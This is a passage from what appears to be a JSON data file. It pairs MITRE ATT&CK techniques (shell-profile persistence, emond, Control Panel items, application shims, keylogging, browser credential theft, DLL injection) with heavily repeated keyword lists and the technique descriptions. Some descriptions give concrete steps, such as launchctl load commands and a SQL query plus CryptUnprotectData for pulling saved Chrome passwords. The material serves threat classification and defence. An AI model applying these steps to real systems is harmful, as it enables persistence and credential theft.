    "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)\n"
  ],
  "event triggered execution: unix shell configuration modification": [
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    "~/.bashrc ",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    " rc.local",
    "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup."
  ],
  "command and scripting interpreter: applescript": [
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "AppleScript",
    "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)"
  ],
  "event triggered execution: emond": [
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    "/sbin/emond ",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    " emond",
    "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service."
  ],
  "system binary proxy execution: control panel": [
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    "CPL files",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    ".cpl",
    "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)"
  ],
  "event triggered execution: application shimming": [
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    "application shim",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    ".sdb",
    "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs."
  ],
  "command and scripting interpreter: windows command shell": [
    "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel."
  ],
  "user execution: malicious file": [
    "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)."
  ],
  "application layer protocol: web protocols": [
    "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
  ],
  "command and scripting interpreter: powershell": [
    "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)"
  ],
  "command and scripting interpreter: visual basic": [
    "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )"
  ],
  "masquerading: match legitimate name or location": [
    "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic."
  ],
  "scheduled task/job: scheduled task": [
    "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) "
  ],
  "create or modify system process: windows service": [
    "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component)."
  ],
  "user execution: malicious link": [
    "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002)."
  ],
  "input capture: keylogging": [
    "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) "
  ],
  "credentials from password stores: credentials from web browsers": [
    "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator)."
  ],
  "system shutdown/reboot": [
    "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)"
  ],
  "process injection: dynamic-link library injection": [
    "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via 